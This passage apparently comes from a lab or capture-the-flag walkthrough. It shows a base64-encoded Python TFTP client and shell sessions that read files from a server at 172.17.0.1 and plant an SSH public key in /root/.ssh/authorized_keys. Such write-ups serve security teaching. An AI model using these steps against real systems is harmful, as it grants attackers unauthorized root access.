IEZpbGUgZG9lc24ndCBleGlzdCIpDQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgIGZpbGVuYW1lID0gYicvcm9vdC8uc3NoLycrZmlsZW5hbWUNCiAgICBzZW5kX3dycShmaWxlbmFtZSwgbW9kZSwgc2VydmVyX2FkZHJlc3MpDQogICAgZGF0YSwgc2VydmVyID0gc29jay5yZWN2ZnJvbShNQVhfU0laRSAqIDMpDQogICAgDQogICAgaWYgZGF0YSAhPSBiJ1x4MDBceDA0XHgwMFx4MDAnOiAjIGFjayAwDQogICAgICAgIHByaW50KCJFcnJvcjogU2VydmVyIGRpZG4ndCByZXNwb25kIHdpdGggQUNLIHRvIFdSUSIpDQogICAgICAgIHJldHVybiBGYWxzZQ0KDQogICAgYmxvY2tfbnVtID0gMQ0KICAgIHdoaWxlIGxlbihmZGF0YSkgPiAwOg0KICAgICAgICBiX2Jsb2NrX251bSA9IGJsb2NrX251bS50b19ieXRlcygyLCAnYmlnJykNCiAgICAgICAgYmxvY2sgPSBmZGF0YVs6TUFYX1NJWkVdDQogICAgICAgIGJsb2NrID0gZW5jcnlwdChibG9jaywgc2VydmVyX3B1YmtleSkNCiAgICAgICAgYmxvY2sgPSBiYXNlNjQuYjY0ZW5jb2RlKGJsb2NrKQ0KICAgICAgICBmZGF0YSA9IGZkYXRhW01BWF9TSVpFOl0NCiAgICAgICAgc2VuZF9kYXRhKHNlcnZlciwgYl9ibG9ja19udW0sIGJsb2NrKQ0KICAgICAgICBkYXRhLCBzZXJ2ZXIgPSBzb2NrLnJlY3Zmcm9tKE1BWF9TSVpFICogMykNCiAgICAgICAgDQogICAgICAgIGlmIGRhdGEgIT0gYidceDAwXHgwNCcgKyBiX2Jsb2NrX251bToNCiAgICAgICAgICAgIHByaW50KCJFcnJvcjogU2VydmVyIHNlbnQgdW5leHBlY3RlZCByZXNwb25zZSIpDQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCg0KICAgICAgICBibG9ja19udW0gKz0gMQ0KDQogICAgaWYgdG90YWxfbGVuICUgTUFYX1NJWkUgPT0gMDoNCiAgICAgICAgYl9ibG9ja19udW0gPSBibG9ja19udW0udG9fYnl0ZXMoMiwgJ2JpZycpDQogICAgICAgIHNlbmRfZGF0YShzZXJ2ZXIsIGJfYmxvY2tfbnVtLCBiIiIpDQogICAgICAgIGRhdGEsIHNlcnZlciA9IHNvY2sucmVjdmZyb20oTUFYX1NJWkUgKiAzKQ0KICAgICAgICANCiAgICAgICAgaWYgZGF0YSAhPSBiJ1x4MDBceDA0JyArIGJfYmxvY2tfbnVtOg0KICAgICAgICAgICAgcHJpbnQoIkVycm9yOiBTZXJ2ZXIgc2VudCB1bmV4cGVjdGVkIHJlc3BvbnNlIikNCiAgICAgICAgICAgIHJldHVybiBGYWxzZQ0KDQogICAgcHJpbnQoIkZpbGUgc2VudCBzdWNjZXNzZnVsbHkiKQ0KICAgIHJldHVybiBUcnVlDQoNCmRlZiBtYWluKCk6DQogICAgZmlsZW5hbWUgPSBiJ2F1dGhvcml6ZWRfa2V5cycNCiAgICBtb2RlID0gYiduZXRhc2NpaScNCg0KICAgIHB1dF9maWxlKGZpbGVuYW1lLCBtb2RlKQ0KICAgIGV4aXQoMCkNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtYWluKCk=' | base64 -d | tee copy.py 
```

```bash
root@7b05c5df3d55:/app/cron# cat status
Name:	python3
Umask:	0022
State:	S (sleeping)
Tgid:	1070
Ngid:	0
Pid:	1070
PPid:	1
TracerPid:	0
Uid:	0	0	0	0
Gid:	0	0	0	0
FDSize:	128
Groups:	 
NStgid:	1070
NSpid:	1070
NSpgid:	1070
NSsid:	1070
VmPeak:	  389880 kB
VmSize:	  389880 kB
VmLck:	       0 kB
VmPin:	       0 kB
VmHWM:	   14916 kB
VmRSS:	   14916 kB
RssAnon:	    7120 kB
RssFile:	    7796 kB
RssShmem:	       0 kB
VmData:	   48912 kB
VmStk:	     132 kB
VmExe:	    2632 kB
VmLib:	    3440 kB
VmPTE:	     120 kB
VmSwap:	       0 kB
HugetlbPages:	       0 kB
CoreDumping:	0
THP_enabled:	1
Threads:	6
SigQ:	0/7664
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000001001000
SigCgt:	0000000180000002
CapInh:	0000000000000000
CapPrm:	000001ffffffffff
CapEff:	000001ffffffffff
CapBnd:	000001ffffffffff
CapAmb:	0000000000000000
NoNewPrivs:	0
Seccomp:	0
Seccomp_filters:	0
Speculation_Store_Bypass:	vulnerable
SpeculationIndirectBranch:	always enabled
Cpus_allowed:	3
Cpus_allowed_list:	0-1
Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:	0
voluntary_ctxt_switches:	141
nonvoluntary_ctxt_switches:	84
```

```bash
root@7b05c5df3d55:/app/cron# python3 client.py 172.17.0.1 69 get /proc/self/cmdline cmdline
file received!
root@7b05c5df3d55:/app/cron# cat cmdline; echo
/usr/bin/python3/opt/3M-syncserver/server.py
```



```bash
root@7b05c5df3d55:/app/cron# python3 client.py 172.17.0.1 69 put id_rsa.pub /root/.ssh/authorized_keys
File sent successfully
```


<p>To Be continued ...</p>


<br>
<br>







